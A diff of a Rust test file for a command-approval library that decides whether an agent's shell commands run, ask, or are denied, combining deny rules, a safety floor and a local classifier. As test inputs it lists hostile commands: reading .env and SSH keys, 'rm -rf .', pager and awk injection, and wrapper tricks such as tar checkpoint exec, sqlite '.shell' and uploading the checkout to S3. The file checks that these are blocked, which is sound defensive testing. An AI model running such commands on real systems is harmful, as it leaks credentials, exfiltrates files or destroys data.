@@ -1,14 +1,14 @@
-//! The model stage as the app plugs it in: `ApprovalConfig.extra`.
+//! The model stage as the app plugs it in: [`decide`] over a whole command.
 
 use std::path::{Path, PathBuf};
 use std::sync::Mutex;
 use std::sync::atomic::{AtomicUsize, Ordering};
 
 use review_approval::model_stage::{
-    ClassifierNote, ClassifierTrace, ClassifyInput, CommandClassifier, DecisionCache, ModelOutcome,
-    ModelPolicy,
+    ClassifierNote, ClassifyInput, CommandClassifier, DecisionCache, MODEL_SOURCE, ModelOutcome,
+    ModelStage, decide,
 };
-use review_approval::{ApprovalConfig, SegmentPolicy, Verdict, classify};
+use review_approval::{ApprovalConfig, Verdict, classify};
 
 struct FakeClassifier {
     outcome: ModelOutcome,
@@ -34,21 +34,34 @@ impl CommandClassifier for FakeClassifier {
     }
 }
 
-fn run_with(cmd: &str, fake: &dyn CommandClassifier, cache: &DecisionCache) -> Verdict {
-    let policy = ModelPolicy {
+fn config<'a>(deny: &'a [String], cwd: Option<&'a Path>) -> ApprovalConfig<'a> {
+    ApprovalConfig {
+        allowed: &[],
+        deny_paths: deny,
+        cwd,
+        extra: &[],
+    }
+}
+
+fn run_full(
+    cmd: &str,
+    fake: &dyn CommandClassifier,
+    cache: &DecisionCache,
+    cwd: Option<&Path>,
+    ask_new: bool,
+) -> (Verdict, Option<ClassifierNote>) {
+    let deny = review_approval::default_deny_paths();
+    let model = ModelStage {
         classifier: fake,
         cache,
-        deadline: None,
-        trace: None,
+        ask_new,
+        run_unsure: false,
     };
-    let extra: [&dyn SegmentPolicy; 1] = [&policy];
-    let cfg = ApprovalConfig {
-        allowed: &[],
-        deny_paths: &[],
-        cwd: None,
-        extra: &extra,
-    };
-    classify(cmd, &cfg)
+    decide(cmd, &config(&deny, cwd), Some(&model))
+}
+
+fn run_with(cmd: &str, fake: &dyn CommandClassifier, cache: &DecisionCache) -> Verdict {
+    run_full(cmd, fake, cache, None, true).0
 }
 
 fn run(cmd: &str, outcome: ModelOutcome) -> Verdict {
@@ -56,92 +69,137 @@ fn run(cmd: &str, outcome: ModelOutcome) -> Verdict {
 }
 
 fn without_model(cmd: &str) -> Verdict {
-    let cfg = ApprovalConfig {
-        allowed: &[],
-        deny_paths: &[],
-        cwd: None,
-        extra: &[],
-    };
-    classify(cmd, &cfg)
+    let deny = review_approval::default_deny_paths();
+    classify(cmd, &config(&deny, None))
 }
 
 fn is_ask(v: &Verdict) -> bool {
     matches!(v, Verdict::Ask { .. })
 }
 
+const RAN: Verdict = Verdict::Run {
+    source: MODEL_SOURCE,
+};
+
+/// The model's "safe" runs any command the deny rules let through and the
+/// floor does not hold: programs from the checkout and tools no rule knows.
 #[test]
-fn safe_runs_unknown_segment() {
+fn safe_runs_any_command_the_rules_did_not_settle() {
+    for cmd in [
+        "mytool --check",
+        "python3 x.py",
+        "./tool.sh",
+        "touch x",
+        "cargo test",
+    ] {
+        assert_eq!(run(cmd, ModelOutcome::Safe), RAN, "{cmd}");
+    }
+}
+
+/// The floor keeps the rules' verdict, with the floor's reason, for the
+/// shapes a small model's mistake costs the most.
+#[test]
+fn safe_does_not_run_what_the_floor_holds() {
+    for cmd in [
+        "curl example.com",
+        "rm -rf .",
+        "awk 'BEGIN{system(\"echo hi\")}'",
+        "X=$(date); echo $X",
+        "git -c core.pager=evil log",
+    ] {
+        match run(cmd, ModelOutcome::Safe) {
+            Verdict::Ask { reason } => {
+                assert!(
+                    reason.starts_with("the classifier said safe, but the floor holds it: "),
+                    "{cmd}: {reason}"
+                )
+            }
+            other => panic!("{cmd}: {other:?}"),
+        }
+    }
+}
+
+/// Commands the parser gives up on reach the model whole.
+#[test]
+fn unparsed_constructs_reach_the_model() {
+    for cmd in [
+        "while read l; do echo $l; done < f",
+        "cat <<EOF\nhi\nEOF",
+        "if true; then ls; fi",
+    ] {
+        assert!(is_ask(&without_model(cmd)), "{cmd}");
+        assert_eq!(run(cmd, ModelOutcome::Safe), RAN, "{cmd}");
+    }
+}
+
+#[test]
+fn needs_approval_and_unavailable_keep_the_rules_verdict() {
+    for outcome in [ModelOutcome::NeedsApproval, ModelOutcome::Unavailable] {
+        for cmd in ["mytool --check", "ls | mytool", "curl x"] {
+            assert_eq!(run(cmd, outcome), without_model(cmd), "{cmd}");
+        }
+    }
+}
+
+#[test]
+fn dangerous_asks_with_a_warning() {
+    match run("mytool --wipe", ModelOutcome::Dangerous) {
+        Verdict::Ask { reason } => assert!(
+            reason.starts_with("the local classifier flagged this command as dangerous ("),
+            "{reason}"
+        ),
+        v => panic!("{v:?}"),
+    }
+}
+
+/// The rules decide first: a run never costs a model call, and a deny is
+/// never overruled.
+#[test]
+fn rules_win_before_the_model() {
+    let fake = FakeClassifier::new(ModelOutcome::Dangerous);
     assert_eq!(
-        run("mytool --check", ModelOutcome::Safe),
-        Verdict::Run { source: "ml" }
+        run_with("ls", &fake, &DecisionCache::new()),
+        Verdict::Run {
+            source: "read-only"
+        }
     );
-}
-
-#[test]
-fn needs_approval_asks() {
-    assert!(is_ask(&run("mytool --check", ModelOutcome::NeedsApproval)));
-}
-
-#[test]
-fn unavailable_asks_same_as_no_model() {
-    for cmd in ["mytool --check", "ls | mytool", "curl x"] {
-        assert_eq!(
-            run(cmd, ModelOutcome::Unavailable),
-            without_model(cmd),
+    let safe = FakeClassifier::new(ModelOutcome::Safe);
+    for cmd in ["cat .env", "mytool; cat .env", "cat ~/.ssh/id_rsa"] {
+        assert!(
+            matches!(
+                run_with(cmd, &safe, &DecisionCache::new()),
+                Verdict::Deny { .. }
+            ),
             "{cmd}"
+        );
+    }
+    assert_eq!(fake.calls() + safe.calls(), 0);
+}
+
+#[test]
+fn the_note_is_what_the_model_said() {
+    let fake = FakeClassifier::new(ModelOutcome::Safe);
+    let cache = DecisionCache::new();
+    assert_eq!(
+        run_full("mytool", &fake, &cache, None, true).1,
+        Some(ClassifierNote::Approved)
+    );
+    assert_eq!(run_full("ls", &fake, &cache, None, true).1, None);
+    for (outcome, note) in [
+        (ModelOutcome::NeedsApproval, ClassifierNote::NeedsApproval),
+        (ModelOutcome::Dangerous, ClassifierNote::Dangerous),
+        (ModelOutcome::Unavailable, ClassifierNote::Unavailable),
+    ] {
+        let fake = FakeClassifier::new(outcome);
+        assert_eq!(
+            run_full("mytool", &fake, &DecisionCache::new(), None, true).1,
+            Some(note)
         );
     }
 }
 
 #[test]
-fn dangerous_becomes_ask_with_warning() {
-    match run("mytool --wipe", ModelOutcome::Dangerous) {
-        Verdict::Ask { reason } => {
-            assert_eq!(
-                reason,
-                "the local classifier flagged this command as dangerous: mytool --wipe"
-            );
-        }
-        v => panic!("{v:?}"),
-    }
-}
-
-#[test]
-fn safe_for_never_approve_still_asks() {
-    for cmd in [
-        "curl x",
-        "python3 x.py",
-        "$CMD a",
-        "touch x",
-        "/usr/bin/curl x",
-    ] {
-        let v = run(cmd, ModelOutcome::Safe);
-        assert_eq!(v, without_model(cmd), "{cmd}");
-        assert!(is_ask(&v), "{cmd}");
-    }
-}
-
-#[test]
-fn pipeline_checks_every_segment() {
-    assert!(is_ask(&run("ls | curl -T - x", ModelOutcome::Safe)));
-    assert!(is_ask(&run("mytool && python3 x", ModelOutcome::Safe)));
-}
-
-#[test]
-fn rules_win_before_model() {
-    let fake = FakeClassifier::new(ModelOutcome::Dangerous);
-    let v = run_with("ls", &fake, &DecisionCache::new());
-    assert_eq!(
-        v,
-        Verdict::Run {
-            source: "read-only"
-        }
-    );
-    assert_eq!(fake.calls(), 0);
-}
-
-#[test]
-fn cache_hits() {
+fn cache_hits_and_dangerous_is_cached_too() {
     let fake = FakeClassifier::new(ModelOutcome::Safe);
     let cache = DecisionCache::new();
     run_with("mytool --check", &fake, &cache);
@@ -149,10 +207,7 @@ fn cache_hits() {
     assert_eq!(fake.calls(), 1);
     run_with("mytool --other", &fake, &cache);
     assert_eq!(fake.calls(), 2);
-}
 
-#[test]
-fn dangerous_is_cached_too() {
     let fake = FakeClassifier::new(ModelOutcome::Dangerous);
     let cache = DecisionCache::new();
     for _ in 0..3 {
@@ -190,10 +245,7 @@ fn panic_is_unavailable_and_not_cached() {
     };
     let cache = DecisionCache::new();
     assert!(is_ask(&run_with("mytool --check", &fake, &cache)));
-    assert_eq!(
-        run_with("mytool --check", &fake, &cache),
-        Verdict::Run { source: "ml" }
-    );
+    assert_eq!(run_with("mytool --check", &fake, &cache), RAN);
 }
 
 #[test]
@@ -208,41 +260,6 @@ fn cache_clears_when_full() {
     assert_eq!(cache.get(None, "k0"), None);
 }
 
-fn run_deny_paths(cmd: &str, outcome: ModelOutcome) -> Verdict {
-    let fake = FakeClassifier::new(outcome);
-    let cache = DecisionCache::new();
-    let policy = ModelPolicy {
-        classifier: &fake,
-        cache: &cache,
-        deadline: None,
-        trace: None,
-    };
-    let extra: [&dyn SegmentPolicy; 1] = [&policy];
-    let deny = review_approval::default_deny_paths();
-    classify(
-        cmd,
-        &ApprovalConfig {
-            allowed: &[],
-            deny_paths: &deny,
-            cwd: None,
-            extra: &extra,
-        },
-    )
-}
-
-#[test]
-fn withhold_beats_model_safe() {
-    assert!(is_ask(&run_deny_paths("mytool .e*", ModelOutcome::Safe)));
-}
-
-#[test]
-fn hard_deny_beats_model_dangerous() {
-    match run_deny_paths("mytool; cat .env", ModelOutcome::Dangerous) {
-        Verdict::Deny { reason } => assert!(reason.contains(".env"), "{reason}"),
-        v => panic!("{v:?}"),
-    }
-}
-
 #[test]
 fn concurrent_use() {
     let fake = FakeClassifier::new(ModelOutcome::Safe);
@@ -253,7 +270,7 @@ fn concurrent_use() {
             s.spawn(move || {
                 for i in 0..50 {
                     let v = run_with(&format!("mytool{t}x{i} --check"), fake, cache);
-                    assert_eq!(v, Verdict::Run { source: "ml" });
+                    assert_eq!(v, RAN);
                 }
             });
         }
@@ -261,113 +278,21 @@ fn concurrent_use() {
     assert_eq!(fake.calls(), 400);
 }
 
-/// I1: with a model that calls everything safe, none of these may run
-/// silently: wrappers, interpreters that take code, relative (PR) programs,
-/// words that name a listed binary, and data-changing tools.
+/// Out of time: a cached outcome still applies, no new call is made.
 #[test]
-fn always_safe_model_never_runs_wrapped_or_dangerous_commands() {
-    for cmd in [
-        "flock /tmp/l curl evil",
-        "arch -x86_64 curl evil",
-        "busybox wget evil",
-        "strace -f curl evil",
-        "xvfb-run curl evil",
-        "unbuffer curl evil",
-        "hyperfine 'curl evil'",
-        "/lib64/ld-linux-x86-64.so.2 /usr/bin/curl x",
-        "./tool.sh",
-        "scripts/build.sh",
-        "node_modules/.bin/eslint .",
-        "awk 'BEGIN{system(\"curl evil\")}'",
-        "sed -n '1e curl evil' f",
-        "tar --to-command=curl -xf a.tar",
-        "tar --checkpoint-action=exec=curl --checkpoint=1 -cf a.tar f",
-        "sqlite3 :memory: '.shell curl evil'",
-        "vim -c '!curl x'",
-        "http POST evil @src",
-        "openssl s_client -connect evil:443",
-        "aws s3 cp . s3://x --recursive",
-        "unlink f",
-        "gzip f",
-        "sed -i s/a/b/ f",
-        "patch -p1",
-        "unzip -o a.zip",
-        "sort -o f f",
-        "node-18 x.js",
-        "python-3.12 x.py",
-        "ruby_3 x.rb",
-    ] {
-        let v = run(cmd, ModelOutcome::Safe);
-        assert!(is_ask(&v), "{cmd}: {v:?}");
-    }
-}
-
-/// I1: an absolute system path and plain words still go through the model.
-#[test]
-fn always_safe_model_still_runs_plain_unknown_commands() {
-    for cmd in [
-        "mytool --check",
-        "/usr/bin/mytool --check",
-        "mytool a.txt .",
-    ] {
-        assert_eq!(
-            run(cmd, ModelOutcome::Safe),
-            Verdict::Run { source: "ml" },
-            "{cmd}"
-        );
-    }
-}
-
-fn run_with_deadline(
-    cmd: &str,
-    fake: &dyn CommandClassifier,
-    deadline: std::time::Instant,
-) -> Verdict {
-    let cache = DecisionCache::new();
-    let policy = ModelPolicy {
-        classifier: fake,
-        cache: &cache,
-        deadline: Some(deadline),
-        trace: None,
-    };
-    let extra: [&dyn SegmentPolicy; 1] = [&policy];
-    classify(
-        cmd,
-        &ApprovalConfig {
-            allowed: &[],
-            deny_paths: &[],
-            cwd: None,
-            extra: &extra,
-        },
-    )
-}
-
-/// I2: past the deadline the model is not consulted at all.
-#[test]
-fn past_deadline_skips_the_classifier() {
+fn no_new_call_once_time_is_up() {
     let fake = FakeClassifier::new(ModelOutcome::Safe);
-    let v = run_with_deadline("mytool --check", &fake, std::time::Instant::now());
+    let cache = DecisionCache::new();
+    let (v, note) = run_full("mytool --check", &fake, &cache, None, false);
     assert_eq!(fake.calls(), 0);
     assert_eq!(v, without_model("mytool --check"));
-}
-
-/// I2: a classify that overruns the deadline stops the model being asked
-/// about the command's remaining segments.
-#[test]
-fn overrun_stops_consulting_the_model_for_later_segments() {
-    struct Slow(AtomicUsize);
-    impl CommandClassifier for Slow {
-        fn classify(&self, _input: &ClassifyInput<'_>) -> ModelOutcome {
-            self.0.fetch_add(1, Ordering::SeqCst);
-            std::thread::sleep(std::time::Duration::from_millis(60));
-            ModelOutcome::Safe
-        }
-    }
-    let slow = Slow(AtomicUsize::new(0));
-    let deadline = std::time::Instant::now() + std::time::Duration::from_millis(20);
-    let v = run_with_deadline("mytool a && mytool b && mytool c", &slow, deadline);
-    assert_eq!(slow.0.load(Ordering::SeqCst), 1);
-    assert!(is_ask(&v), "{v:?}");
+    assert_eq!(note, None);
+    run_with("mytool --check", &fake, &cache);
+    assert_eq!(
+        run_full("mytool --check", &fake, &cache, None, false).0,
+        RAN
+    );
+    assert_eq!(fake.calls(), 1);
 }
 
 /// A classifier that can be switched off mid-run.
@@ -393,16 +318,13 @@ fn inactive_classifier_ignores_cached_outcomes_and_is_not_called() {
     };
     let cache = DecisionCache::new();
     let cmd = "/usr/bin/pr -t file.txt";
-    assert!(matches!(run_with(cmd, &model, &cache), Verdict::Run { .. }));
+    assert_eq!(run_with(cmd, &model, &cache), RAN);
     assert_eq!(model.inner.calls(), 1);
-    // Cached Safe, but the model is switched off: the command asks, and
-    // there is no further call.
     model.active.store(false, Ordering::SeqCst);
     assert!(is_ask(&run_with(cmd, &model, &cache)));
     assert_eq!(model.inner.calls(), 1);
-    // Back on: the cached outcome applies again.
     model.active.store(true, Ordering::SeqCst);
-    assert!(matches!(run_with(cmd, &model, &cache), Verdict::Run { .. }));
+    assert_eq!(run_with(cmd, &model, &cache), RAN);
     assert_eq!(model.inner.calls(), 1);
 }
 
@@ -416,42 +338,28 @@ impl CommandClassifier for Recorder {
         self.seen
             .lock()
             .unwrap()
-            .push((input.cwd.map(Path::to_path_buf), input.segment.to_string()));
+            .push((input.cwd.map(Path::to_path_buf), input.command.to_string()));
         ModelOutcome::Safe
     }
 }
 
-fn run_in(cmd: &str, cwd: Option<&Path>, fake: &dyn CommandClassifier, cache: &DecisionCache) {
-    let policy = ModelPolicy {
-        classifier: fake,
-        cache,
-        deadline: None,
-        trace: None,
-    };
-    let extra: [&dyn SegmentPolicy; 1] = [&policy];
-    classify(
-        cmd,
-        &ApprovalConfig {
-            allowed: &[],
-            deny_paths: &[],
-            cwd,
-            extra: &extra,
-        },
-    );
-}
-
+/// The model sees the whole command, trimmed, as written: not one segment.
 #[test]
-fn cwd_reaches_the_classifier() {
+fn the_whole_command_and_cwd_reach_the_classifier() {
     let fake = Recorder {
         seen: Mutex::new(Vec::new()),
     };
     let repo = Path::new("/repo");
-    run_in("mytool --check", Some(repo), &fake, &DecisionCache::new());
-    run_in("mytool --check", None, &fake, &DecisionCache::new());
+    let cmd = "  ls && mytool \"a  b\" | grep x  ";
+    run_full(cmd, &fake, &DecisionCache::new(), Some(repo), true);
+    run_full("mytool --check", &fake, &DecisionCache::new(), None, true);
     assert_eq!(
         *fake.seen.lock().unwrap(),
         [
-            (Some(repo.to_path_buf()), "mytool --check".to_string()),
+            (
+                Some(repo.to_path_buf()),
+                "ls && mytool \"a  b\" | grep x".to_string()
+            ),
             (None, "mytool --check".to_string()),
         ]
     );
@@ -462,11 +370,9 @@ fn cache_key_includes_cwd() {
     let fake = FakeClassifier::new(ModelOutcome::Safe);
     let cache = DecisionCache::new();
     let (a, b) = (Path::new("/a"), Path::new("/b"));
-    run_in("mytool --check", Some(a), &fake, &cache);
-    run_in("mytool --check", Some(b), &fake, &cache);
-    assert_eq!(fake.calls(), 2);
-    run_in("mytool --check", Some(a), &fake, &cache);
-    run_in("mytool --check", Some(b), &fake, &cache);
+    for cwd in [a, b, a, b] {
+        run_full("mytool --check", &fake, &cache, Some(cwd), true);
+    }
     assert_eq!(fake.calls(), 2);
 }
 
@@ -481,112 +387,28 @@ fn a_new_classifier_generation_empties_the_cache() {
     assert_eq!(cache.get(None, "ls"), None);
 }
 
-/// The trace the UI reads: one note per segment the model was consulted on,
-/// and a single aggregated verdict per command.
-fn run_traced(cmd: &str, outcome: ModelOutcome) -> (Verdict, Option<ClassifierNote>) {
-    let trace = ClassifierTrace::new();
-    let fake = FakeClassifier::new(outcome);
-    let cache = DecisionCache::new();
-    let policy = ModelPolicy {
-        classifier: &fake,
-        cache: &cache,
-        deadline: None,
-        trace: Some(&trace),
-    };
-    let extra: [&dyn SegmentPolicy; 1] = [&policy];
-    let verdict = classify(
-        cmd,
-        &ApprovalConfig {
-            allowed: &[],
-            deny_paths: &[],
-            cwd: None,
-            extra: &extra,
-        },
-    );
-    let ran = matches!(verdict, Verdict::Run { .. });
-    let note = trace.note(ran);
-    (verdict, note)
-}
-
+/// "Ask only on danger": an unsure model runs the command unless the floor
+/// holds it; a missing answer never runs it.
 #[test]
-fn traces_record_the_model_verdict() {
-    // A command the rules cannot vouch for, approved by the model: it ran
-    // on the model's word.
-    let (verdict, note) = run_traced("mytool --check", ModelOutcome::Safe);
-    assert!(matches!(verdict, Verdict::Run { .. }), "{verdict:?}");
-    assert_eq!(note, Some(ClassifierNote::Approved));
-
-    // A safe verdict on a never-auto-run binary asks anyway: the model's
-    // word is shown but never runs the command.
-    let (verdict, note) = run_traced("curl example.com", ModelOutcome::Safe);
-    assert!(matches!(verdict, Verdict::Ask { .. }), "{verdict:?}");
-    assert_eq!(note, Some(ClassifierNote::Blocked));
-
-    // Abstain and danger show as what they are.
-    assert_eq!(
-        run_traced("mytool --check", ModelOutcome::NeedsApproval).1,
-        Some(ClassifierNote::NeedsApproval)
-    );
-    assert_eq!(
-        run_traced("mytool --check", ModelOutcome::Dangerous).1,
-        Some(ClassifierNote::Dangerous)
-    );
-    assert_eq!(
-        run_traced("mytool --check", ModelOutcome::Unavailable).1,
-        Some(ClassifierNote::Unavailable)
-    );
-}
-
-#[test]
-fn an_unconsulted_command_leaves_no_trace() {
-    // A read-only command is vouched by the rules before the model is ever
-    // consulted: no note, nothing to show.
-    let trace = ClassifierTrace::new();
-    let fake = FakeClassifier::new(ModelOutcome::Safe);
-    let cache = DecisionCache::new();
-    let policy = ModelPolicy {
-        classifier: &fake,
-        cache: &cache,
-        deadline: None,
-        trace: Some(&trace),
+fn run_unsure_runs_what_the_model_did_not_flag() {
+    let deny = review_approval::default_deny_paths();
+    let cfg = config(&deny, None);
+    let verdict = |cmd: &str, outcome: ModelOutcome| {
+        let fake = FakeClassifier::new(outcome);
+        let cache = DecisionCache::new();
+        let model = ModelStage {
+            classifier: &fake,
+            cache: &cache,
+            ask_new: true,
+            run_unsure: true,
+        };
+        decide(cmd, &cfg, Some(&model)).0
     };
-    let extra: [&dyn SegmentPolicy; 1] = [&policy];
-    classify(
-        "ls -la",
-        &ApprovalConfig {
-            allowed: &[],
-            deny_paths: &[],
-            cwd: None,
-            extra: &extra,
-        },
-    );
-    assert_eq!(fake.calls(), 0);
-    assert_eq!(trace.note(true), None);
-}
-
-#[test]
-fn a_dangerous_segment_wins_the_aggregate() {
-    // `ls && mytool`: the model is consulted only for the segment the rules
-    // cannot vouch for; its danger carries the whole command.
-    let trace = ClassifierTrace::new();
-    let fake = FakeClassifier::new(ModelOutcome::Dangerous);
-    let cache = DecisionCache::new();
-    let policy = ModelPolicy {
-        classifier: &fake,
-        cache: &cache,
-        deadline: None,
-        trace: Some(&trace),
-    };
-    let extra: [&dyn SegmentPolicy; 1] = [&policy];
-    classify(
-        "ls && mytool --check",
-        &ApprovalConfig {
-            allowed: &[],
-            deny_paths: &[],
-            cwd: None,
-            extra: &extra,
-        },
-    );
-    assert_eq!(trace.notes(), [ClassifierNote::Dangerous]);
-    assert_eq!(trace.note(false), Some(ClassifierNote::Dangerous));
+    assert_eq!(verdict("mytool --check", ModelOutcome::NeedsApproval), RAN);
+    assert!(is_ask(&verdict("rm -rf .", ModelOutcome::NeedsApproval)));
+    assert!(is_ask(&verdict("mytool --check", ModelOutcome::Dangerous)));
+    assert!(is_ask(&verdict(
+        "mytool --check",
+        ModelOutcome::Unavailable
+    )));
 }
